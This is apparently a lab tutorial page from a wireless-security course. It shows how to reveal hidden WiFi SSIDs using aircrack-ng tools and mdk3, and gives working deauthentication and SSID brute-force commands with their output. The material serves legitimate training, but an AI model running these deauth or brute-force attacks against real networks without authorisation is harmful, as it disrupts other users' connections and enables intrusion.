---
title: Hidden SSID
description: Hidden SSID
date: '2026-09-21'
tags: []
published: true
slug: hidden-ssid
category: wifi
folder: basic-control-bypass
order: 10
---
# Finding Hidden SSIDs

## What's a Hidden SSID?

The **SSID** is just the name of a WiFi network. Most networks broadcast their name so devices can easily find and connect to them.

Some networks **hide** their name instead, thinking it makes them more secure. In reality, this is only a small speed bump, hidden networks can still be found with the right tools.

---

## Step 1: Turn On Monitor Mode

Just like before, we need monitor mode to scan properly:

```shellsession
0x0w3@fedora[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

---

## Step 2: Scan for Hidden Networks

Now scan using airodump-ng:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  <length: 12>                                
 D2:A3:32:13:29:D5  -28   0        9        0    0   1   54   WPA3 CCMP   SAE  <length:  8>                                
 A2:FF:31:2C:B1:C4  -28   0        9        0    0   1   54   WPA2 CCMP   PSK  <length:  4>                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4   
```

Notice the `ESSID` column doesn't show a name, instead it shows `<length: x>`. This just means the network is hidden, and `x` tells you how many characters its name has.

**In this example**, there are 3 hidden networks with names of 12, 8, and 4 characters.

---

## Two Ways to Reveal a Hidden Name

1. **Deauth attack** --> kick a connected device off, then catch its reconnect (which reveals the name)
2. **Brute-force attack** --> guess the name directly using a tool

⚠️ **Important:** Deauth attacks **don't work on WPA3** networks. WPA3 has a built-in protection (called PMF) that blocks fake deauth requests. For WPA3, you'll need to brute-force instead.

---

## Method 1: Deauth Attack

This works when a device is already connected to the hidden network.

**Step 1:** Start watching the network with airodump-ng:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng -c 1 wlan0mon
```

**Step 2:** In the earlier scan, we saw a device (`02:00:00:00:02:00`) connected to network `B2:C1:3D:3B:2B:A1`. Send it a deauth request to force a disconnect:

```shellsession
0x0w3@fedora[/htb]$ sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon

12:34:56  Waiting for beacon frame (BSSID: B2:C1:3D:3B:2B:A1) on channel `
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|60 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|57 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|61 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|60 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|59 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|55 ACKs]
```

**Why this works:** When the device reconnects, it has to send a "re-association request" that includes the actual network name. Airodump-ng catches that request and reveals the name.

**Step 3:** Check airodump-ng again, the name should now appear:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  jacklighters

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4         jacklighters
```

🎉 The hidden name is revealed: **jacklighters**

---

## Method 2: Brute-Force Attack

Use this when there's no device connected (or the network is WPA3). We'll use a tool called **mdk3**.

### Basic Command Format

```
mdk3 <interface> <test mode> [test_options]
```

The mode we care about is `p`, probing / SSID brute-force mode. Key options:

|Option|What It Does|
|---|---|
|`-e`|Specify a specific SSID to probe|
|`-f`|Use a wordlist file to guess names|
|`-t`|Target access point's MAC address|
|`-s`|Set speed (default: unlimited; brute-force default: 300)|
|`-b`|Full brute-force mode (best for short names)|

---

### Option A: Try Every Possible Combination

Use `-b` to try all possible character combinations. You can choose what kind of characters to try:

|Code|Character Set|
|---|---|
|`u`|Upper case letters|
|`n`|Digits (numbers)|
|`a`|All printable characters|
|`c`|Upper and lower case letters|
|`m`|Upper/lower case letters + numbers|

**Example:**

```shellsession
0x0w3@fedora[/htb]$ sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4

SSID Bruteforce Mode activated!


channel set to: 1
Waiting for beacon frame from target...


SSID is hidden. SSID Length is: 4.
Sniffer thread started

Got response from A2:FF:31:2C:B1:C4, SSID: "WIFI"
Last try was: WIFI
```

🎉 Found it, the hidden name was **WIFI**.

---

### Option B: Use a Wordlist

Instead of guessing every combination, you can try names from a wordlist file:

```shellsession
0x0w3@fedora[/htb]$ sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5

SSID Wordlist Mode activated!

Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 8.

Got response from D2:A3:32:1B:29:D5, SSID: "HTB-Wifi"
```

🎉 Found it, the hidden name was **HTB-Wifi**.
